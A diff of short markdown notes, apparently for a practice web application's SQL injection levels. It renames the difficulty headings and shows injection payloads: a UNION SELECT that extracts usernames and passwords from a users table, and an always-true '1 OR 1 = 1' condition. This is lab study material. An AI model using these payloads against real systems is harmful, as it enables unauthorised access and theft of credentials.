@@ -1,4 +1,4 @@
-# Low level 
+# Low Difficulty: 
 ```
 id=1&Submit=Submit#
 ```
@@ -34,14 +34,14 @@ which means username is not one of the field from the table, but password is one
 ' UNION SELECT user, password FROM users#
 ```
 
-Medium:
+# Medium Difficulty:
 Inspect the web
 Edit the Value from the choice to the condition always true
 for example 
 ```
 1 OR 1 = 1
 ```
-Higher difficulty:
+# High Difficulty:
 on the change ID insert
 ```
 'Session ID: 'UNION SELECT user,password from users#' 
